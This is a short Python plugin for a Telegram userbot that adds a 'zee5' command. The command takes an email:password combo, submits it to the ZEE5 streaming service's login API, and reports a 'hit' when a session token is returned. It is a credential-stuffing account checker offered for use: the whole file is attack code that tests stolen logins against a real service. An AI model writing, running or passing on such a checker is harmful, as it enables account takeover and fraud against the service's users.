# InBuilt
from . import *

# Site-Packages
import requests
from bs4 import BeautifulSoup


@ultroid_cmd(pattern="zee5 ?(.*)")
async def zee5_checker(event):
    if event.fwd_from:
        return False
    combo = event.pattern_match.group(1)
    if combo is None:
        await event.edit("**Provide A Combo To Check\n\n(C) @TheUltroid**")
    try:
        email = combo.split(":")[0]
        _pass_ = combo.split(":")[1]
    except IndexError:
        await event.edit("**Invalid Combo\n\n(C) @TheUltroid**")
        return False
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    url = "https://userapi.zee5.com/v1/user/loginemail?email={_user}&password={_pass}"
    page = requests.get(url.format(_user=email, _pass=_pass_, headers=headers)).text
    soup = BeautifulSoup(page, 'html.parser').text
    if "token\":\"" in str(soup):
        await event.edit(f"**Found Hit\n{combo}\n\n(C) @TheUltroid**")
        return True
    else:
        await event.edit(f"**Not A Hit\n{combo}\n\n(C) @TheUltroid**")
        return False

